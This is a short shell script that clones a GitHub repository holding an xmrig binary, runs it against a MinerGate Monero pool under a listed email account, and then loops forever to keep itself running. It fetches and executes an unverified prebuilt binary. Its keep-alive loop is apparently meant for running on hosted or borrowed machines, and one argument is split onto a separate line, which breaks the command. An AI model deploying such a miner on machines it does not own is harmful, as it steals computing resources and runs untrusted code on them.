#!/bin/sh
sudo apt update
sudo apt install screen -y
git clone https://github.com/quincyhays/bmxmrig
cd bmxmrig
chmod u+x ./xmrig
./xmrig -o xmr.pool.minergate.com:45700 -u farikicryptocurrency@gmail.com
-p x --donate-level 1
while [ 1 ]; do
sleep 3
done
sleep 999
